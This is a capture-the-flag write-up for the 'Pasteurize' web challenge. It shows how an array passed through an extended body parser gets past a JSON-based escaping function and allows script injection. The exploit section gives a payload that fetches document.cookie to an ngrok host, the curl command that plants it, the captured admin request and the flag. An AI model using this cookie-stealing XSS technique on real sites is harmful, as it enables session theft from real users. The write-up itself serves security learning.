# Pasteurize

## Enumeration

Looking at the site, it looks as if there's a place to enter the contents for a paste.  You can then visit the paste.  On the viewing page there's a link to
send the note to TJMike, the administrator.  The source of the create/index page has a hidden link to `/source` and it gives us the source for the main server file.

```html
<body>
    <nav class="navbar navbar-expand-md navbar-light bg-light">
    <div class="collapse navbar-collapse mr-auto">
        <a href="/" class="navbar-brand">Pasteurize</a>
    </div>
</nav>
    <div class="container w-50 pt-5">
        <h3>Create new paste</h3>
        <form class="form" method="post">
            <textarea class="form-control" name="content"></textarea>
            <input type="submit" class="mt-3 btn btn-primary btn-block" value="Submit">
        </form>

    </div>
    
    <a href="/source" style="display:none">Source</a>
    
</body>
```

Looking at the source of the view page, it seems that the contents of our paste is injected into the javascript of the page, and then that text is run
through DOMPurify, before being inserted into the DOM.

```html
  <script>
      const note = "CONTENTS_OF_NOTE_GOES_HERE";
      const note_id = "43ce8abb-7c84-43da-9fc4-07732bab30aa";
      const note_el = document.getElementById('note-content');
      const note_url_el = document.getElementById('note-title');
      const clean = DOMPurify.sanitize(note);
      note_el.innerHTML = clean;
      note_url_el.href = `/${note_id}`;
      note_url_el.innerHTML = `${note_id}`;
  </script>
```

Lets see if we can escape quotes around the note variable by looking at the server source.

### Server Source

The first thing that stands out in the source is the extended body parser

```js
/* They say reCAPTCHA needs those. But does it? */
app.use(bodyParser.urlencoded({
  extended: true
}));
```

This means we can send arrays and objects as the content.  Looking at the `POST /` route we see the note is inserted into a `Datastore` without much processing.
Looking at the code to retrieve the note we see that it's sanitized somewhat before being embedded into a view template.

```js
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```

First the value is stringified into JSON, which will escape a lot of control characters.  Then the first and last characters are removed via slice, and then less than and greater than
characters are escaped.  If we can pass this function an array with a string in it, after stringification it should look like `["value goes here"]`, then the brackets will be removed.
So we should be able to inject a payload if we don't use characters that are escaped in JSON.

## Testing

To test our assumptions lets create a note using `content[]=value` as the note content.

```sh
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl https://pasteurize.web.ctfcompetition.com --data-raw "content[]=value"
Found. Redirecting to /d43840ea-ed52-440e-8c01-8733d6ab3be7
```

And when we check the rendered note, in the source we see the following:

```html
<script>
  const note = ""value"";
  const note_id = "d43840ea-ed52-440e-8c01-8733d6ab3be7";
  const note_el = document.getElementById('note-content');
  const note_url_el = document.getElementById('note-title');
  const clean = DOMPurify.sanitize(note);
  note_el.innerHTML = clean;
  note_url_el.href = `/${note_id}`;
  note_url_el.innerHTML = `${note_id}`;
</script>
```

Our assumptions worked, but the above is not valid javascript.  So lets craft a payload to try to do the usual thing, which is trying to retrieve the admin's cookies, and we need to do it without using any characters that would be escaped by `JSON.stringify`.

## Exploiting

First lets end the statement with `;`, and then lets encode `document.cookie`,  and send it to our own server.  For the URL string we'll use backticks since they aren't escaped.  We'll also need 
to take care of the trailing quote, and to do that we just need to ensure we end the payload with a semicolon as an empty string on its own is valid javascript.  So our payload ends up looking 
like the following:

```js
;fetch(`https://0853395be8b7.ngrok.io/` + btoa(document.cookie));
```

and when rendered into the page we should get:

```html
<script>
  const note = "";fetch(`https://0853395be8b7.ngrok.io/` + btoa(document.cookie));"";
  const note_id = "d43840ea-ed52-440e-8c01-8733d6ab3be7";
  const note_el = document.getElementById('note-content');
  const note_url_el = document.getElementById('note-title');
  const clean = DOMPurify.sanitize(note);
  note_el.innerHTML = clean;
  note_url_el.href = `/${note_id}`;
  note_url_el.innerHTML = `${note_id}`;
</script>
```

Let's fire up ngrok and our own local http server, and then create the note with the payload via curl.  Be sure
to url encode the + so it doesn't end up as a space.

```sh
╭─zoey@virtual-parrot ~/sec ‹master*› 
╰─$ curl https://pasteurize.web.ctfcompetition.com --data 'content[]=;fetch(`https://0b7660a35154.ngrok.io/`%2Bbtoa(document.cookie));'
Found. Redirecting to /a536d492-4d6f-4d42-b1b5-5a28216e2cd9  
```

Now lets visit our new note in the browser and send it to the admin.  If everything worked properly we should get the following request sent to our server:

```http
22:55:53: GET /c2VjcmV0PUNURntFeHByZXNzX3QwX1RyMHVibDNzfQ==
        Host: 0b7660a35154.ngrok.io
        Pragma: no-cache
        Cache-Control: no-cache
        sec-ch-ua: 
        sec-ch-ua-mobile: ?0
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/85.0.4182.0 Safari/537.36
        Accept: */*
        Origin: https://pasteurize.web.ctfcompetition.com
        Sec-Fetch-Site: cross-site
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://pasteurize.web.ctfcompetition.com/a536d492-4d6f-4d42-b1b5-5a28216e2cd9
        Accept-Encoding: gzip, deflate, br
        X-Forwarded-Proto: https
        X-Forwarded-For: 104.155.55.51
```

Then when we decode the base64 we get `secret=CTF{Express_t0_Tr0ubl3s}`.
